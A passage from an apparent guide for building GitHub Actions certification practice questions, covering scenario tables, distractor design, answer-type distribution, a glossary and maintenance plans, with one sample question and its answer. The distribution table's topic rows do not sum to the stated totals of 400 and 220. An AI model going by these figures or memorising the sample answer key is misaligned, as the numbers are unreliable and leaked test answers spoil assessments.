| **Manual workflow dispatch** | User triggers workflow from UI | Ad-hoc testing, hotfixes |
| **Scheduled nightly** | Cron-scheduled job at 2 AM UTC | Background maintenance |

**Topic 18: Security & Tokenization**

| Scenario | Description | Question Focus |
| --- | --- | --- |
| **OIDC to AWS** | Using OIDC to assume AWS role | Token federation setup |
| **Third-party action with secrets** | Popular GitHub action needs API key | Trustworthiness assessment |
| **User input in shell command** | Workflow receives untrusted user input | Script injection risk |
| **Matrix with env vars** | Dynamic matrix values from environment | Scope & availability |
| **Container job with secrets** | Secrets in container-based job context | Context scope rules |

---

## 23. Distractor Bank & Quality Examples

### Good Distractors (Plausible, ~50% knowledge)

```
Question: Which context is available in a reusable workflow called by another workflow?

Correct: github (workflow-level info like sha, ref is available)

Good Distractors:
- A) env (partially correct but limited scope; local vars only, not calling workflow's)
- B) secrets (plausible misconception; often assumed available but aren't accessible by default in reusable workflows)
- C) runner (plausible but runner info is only for the current executor)
```

### Bad Distractors (Not Plausible)

```
Avoid:
- "The flibbertigibbet context"  ← Obviously fake
- "RUNNER_COLOR environment variable contains hex color codes"  ← Too obscure/unrelated
- "Use github.workflow_run_id"  ← Close to real property but clearly wrong
```

---

## 24. Common Pitfalls & Anti-Patterns in Question Generation

### Pitfalls to Avoid

| Pitfall | Example | Fix |
| --- | --- | --- |
| **Two-part questions** | "Does X happen, and if so, when?" | Split into two separate questions |
| **Negation stacking** | "Which is NOT not available?" | Rephrase with positive logic |
| **Ambiguous scenario** | "A workflow runs successfully" (need: in what context?) | Add specific details |
| **Distractor that's actually correct** | QA team reviews both distractors and finds one is defensible | Validate against guide; rewrite |
| **Testing recall instead of application** | "What does github.event.number mean?" | Upgrade: "You need job index; which context?" |
| **Over-long scenario** | 8 sentences of setup (candidate gets lost) | Trim to 2–3 key details |

---

## 25. Answer Distribution & Topic Breakdown

### Recommended Distribution by Topic & Answer Type

| Topic # | Total | `one` | `many` | `all` | `none` |
| --- | --- | --- | --- | --- | --- |
| 1 | 12 | 7 | 3 | 1 | 1 |
| 2 | 26 | 14 | 7 | 3 | 2 |
| 3 | 19 | 10 | 5 | 2 | 2 |
| 4 | 30 | 17 | 8 | 3 | 2 |
| 5 | 30 | 17 | 8 | 3 | 2 |
| 6 | 22 | 12 | 6 | 2 | 2 |
| 7 | 19 | 10 | 5 | 2 | 2 |
| 8 | 22 | 12 | 6 | 2 | 2 |
| 9 | 26 | 14 | 7 | 3 | 2 |
| 10 | 22 | 12 | 6 | 2 | 2 |
| 11 | 19 | 10 | 5 | 2 | 2 |
| 12 | 21 | 11 | 6 | 2 | 2 |
| 13 | 19 | 10 | 5 | 2 | 2 |
| 14 | 15 | 8 | 4 | 1 | 2 |
| 15 | 21 | 11 | 6 | 2 | 2 |
| 16 | 21 | 11 | 6 | 2 | 2 |
| 17 | 26 | 14 | 7 | 3 | 2 |
| 18 | 29 | 16 | 8 | 3 | 2 |
| 19 | 21 | 11 | 6 | 2 | 2 |
| **TOTAL** | **400** | **220** | **104** | **48** | **28** |

---

## 26. Glossary & Key Terminology

| Term | Definition |
| --- | --- |
| **Semantic Duplication** | Two questions that test the same concept/skill, even if worded differently. Example: "What's GITHUB_TOKEN default scope?" vs. "Which permissions does GITHUB_TOKEN have by default?" |
| **Cognitive Level** | Bloom's taxonomy tier: Recall < Comprehension < Application < Analysis < Synthesis < Evaluation |
| **Plausibility** | The degree to which a distractor would fool someone with partial knowledge. Ideal: 40–60% of novices pick the distractor. |
| **Context Scope** | Which workflow constructs can access a given context. Example: `job` context is available to steps in the job; `needs` is available to jobs that declare dependency. |
| **Script Injection** | Unvalidated user input interpolated into shell commands, allowing attacker to execute arbitrary commands. |
| **SHA Pinning** | Using full commit SHA (`@abc123def`) instead of semver tag (`@v2.0.0`) to lock action to immutable version. |
| **OIDC** | OpenID Connect: protocol for exchanging GitHub-issued tokens for cloud provider credentials without storing long-lived secrets. |
| **Hotspot Topic** | Topic with disproportionate exam weight; prioritize for high-quality questions. Topics 2, 5, 18 are hotspots. |
| **Edge Case** | Boundary condition or unusual scenario; critical for hard questions. Example: "What happens if two jobs write the same artifact?" |
| **Distractor Pool** | Set of 3–5 plausible wrong answers for each question; rotate by iteration to vary question sets. |

---

## 27. Customization & Adjustment Guide

### Scaling to Different Question Counts

| Target | Simple Adjustments | Rationale |
| --- | --- | --- |
| **600 questions** | +50% per topic; keep 20/60/20 split | 1.5× difficulty: 120/360/120 |
| **250 questions** | –37.5% per topic; keep ratios | Focus on hotspots (T2, T5, T18 less reduction) |
| **300 questions** | –25% per topic; easy reduction | Remove lowest-impact scenarios |

### Adjusting Difficulty Distribution

**Use case**: Organization prefers harder questions for advanced practitioners.

- **Default**: 20% Easy / 60% Medium / 20% Hard
- **Advanced Variant**: 10% Easy / 50% Medium / 40% Hard (shift 50 questions up one tier)

### Adjusting Answer Type Distribution

**Use case**: Learner platform only supports single-answer questions.

- **Default**: 55% one, 26% many, 12% all, 7% none
- **Single-Answer Variant**: 100% one (eliminate many/all/none; simplify "Select all that apply" to "Which is most correct?")

---

## 28. Feedback & Refinement Loop

### User Feedback Integration

**Collect Feedback On**:

- Question clarity (was it ambiguous?)
- Difficulty accuracy (was it harder/easier than labeled?)
- Distractor plausibility (did wrong answers feel realistic?)
- Answer key correctness (was explanation accurate?)

**Feedback Integration Process**:

1. **Identify Recurring Issues**: If >5% of candidates report same question as "ambiguous", flag for revision.
2. **Update Distractor Pool**: If distractor is consistently ignored, replace with more plausible alternative.
3. **Adjust Difficulty Labels**: If "Easy" questions average 65% pass rate, relabel to Medium.
4. **Document Changes**: Log refinements with rationale; use for future iterations.

### Incorporation Timeline

- **Immediate**: Fix factual errors (wrong answer key)
- **Next Iteration**: Update distractors based on candidate performance
- **Quarterly**: Holistic review; adjust topic weights if exam domain shifts

---

## 29. Integration & Workflow Connection

### Downstream Use Cases

**1. Exam Platform Integration**

```
Quiz → Export → LMS (Canvas, Moodle) → Scoring/Analytics
  ↓
Question metadata (topic, difficulty, answer type) → Platform dashboard
  ↓
Candidate performance by topic → Identify knowledge gaps → Recommend remediation
```

**2. Learning Path Mapping**

- Easy questions → Onboarding learners (Week 1–2)
- Medium questions → Intermediate labs (Week 3–4)
- Hard questions → Capstone project (Week 5–6)

**3. Pre-Assessment & Diagnostic**

- Run 20-question subset (random mix) → Quick readiness assessment
- If <50% pass: recommend foundational course first
- If >80% pass: skip to advanced topics

**4. Performance Analytics**

```
Per-Topic Metrics:
- Pass rate by difficulty (identify weak areas)
- Average time-to-answer (complex topics take longer)
- Distractor pick frequency (which misconceptions persist?)
```

### Version Control & Archival

**File Naming Strategy**:
```
quiz/gh-200-iteration-1.md         (Initial generation)
quiz/gh-200-iteration-2.md         (Second run, different questions)
quiz/gh-200-iteration-2-refined.md (After feedback refinement)
quiz/gh-200-live-v1.0.md           (Production release)
```

**Archive & Audit Trail**:

- Keep all iterations for historical reference
- Document when questions were added/removed and why
- Maintain copy of exam-overview.md used for generation (in case spec changes)

---

## 30. Maintenance & Evolution

### Ongoing Maintenance Schedule

| Frequency | Task | Owner |
| --- | --- | --- |
| **Monthly** | Monitor candidate performance metrics; identify outlier questions | QA Lead |
| **Quarterly** | Update questions for new GitHub Actions features; retire outdated scenarios | Content SME |
| **Semi-annually** | Full review; incorporate user feedback; generate new iteration | Exam Committee |
| **Annually** | Validate against updated `exam-overview.md`; confirm topic weights still accurate | Certification Board |

### Deprecation & Sunset

- Questions become stale when feature changes significantly (e.g., OIDC becomes default, old secret-based scenarios obsolete)
- Mark questions with `deprecated: true` tag; exclude from live exams but keep for reference
- Replacement questions created before sunset date
